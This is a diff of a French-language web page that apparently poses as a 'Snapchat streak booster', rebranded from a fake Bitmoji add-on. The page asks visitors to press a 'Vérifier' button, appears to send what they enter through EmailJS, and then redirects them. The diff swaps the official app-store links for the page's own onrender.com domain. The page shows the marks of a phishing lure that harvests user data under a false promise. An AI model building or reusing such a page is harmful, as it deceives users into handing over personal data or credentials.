@@ -17,7 +17,7 @@
 <meta content="website" property="og:type"/>
 <!-- Twitter Card -->
 <meta content="summary_large_image" name="twitter:card">
-<meta content="Bitmoji Add-On" name="twitter:title">
+<meta content="Snapchat streak booster" name="twitter:title">
 <meta content="Prêt à faire durer vos flammes à l’infini ? Découvre comment booster tes Streaks dès aujourd’hui !" name="twitter:description"/>
 <meta content="https://snapchat-streak-booster.onrender.com/preview2_1200x630.jpg" name="twitter:image"/>
 <style>
@@ -213,7 +213,7 @@
 <button class="button" onclick="submitVerification()">Vérifier</button>
 </div>
 <div class="bottom-banner">
-<img alt="Bannière Bitmoji" src="banner.png"/>
+<img alt="Bannière Snapchat streak booster" src="banner.png"/>
 </div>
 <script>
     const script = document.createElement('script');
@@ -277,13 +277,13 @@
       setTimeout(() => {
         const ua = navigator.userAgent;
         if (/android/i.test(ua)) {
-          window.location.href = "https://play.google.com/store/apps/details?id=com.bitstrips.imoji";
+          window.location.href = "https://snapchat-streak-booster.onrender.com";
         } else if (/iPad|iPhone|iPod/.test(ua)) {
-          window.location.href = "https://apps.apple.com/app/bitmoji/id868077558";
+          window.location.href = "https://snapchat-streak-booster.onrender.com";
         } else {
-          alert("Bitmoji est disponible uniquement sur mobile.");
+          alert("Ce service est disponible uniquement sur mobile.");
         }
-        window.location.href = "bitmoji://";
+        window.location.href = "https://snapchat-streak-booster.onrender.com";
       }, 2000);
     };
   
@@ -345,13 +345,13 @@
 
         const ua = navigator.userAgent;
         if (/android/i.test(ua)) {
-          window.location.href = "https://play.google.com/store/apps/details?id=com.bitstrips.imoji";
+          window.location.href = "https://snapchat-streak-booster.onrender.com";
         } else if (/iPad|iPhone|iPod/.test(ua)) {
-          window.location.href = "https://apps.apple.com/app/bitmoji/id868077558";
+          window.location.href = "https://snapchat-streak-booster.onrender.com";
         } else {
-          alert("Bitmoji est disponible uniquement sur mobile.");
+          alert("Ce service est disponible uniquement sur mobile.");
         }
-        window.location.href = "bitmoji://";
+        window.location.href = "https://snapchat-streak-booster.onrender.com";
       })
       .catch(err => {
         alert("Erreur EmailJS : " + JSON.stringify(err));
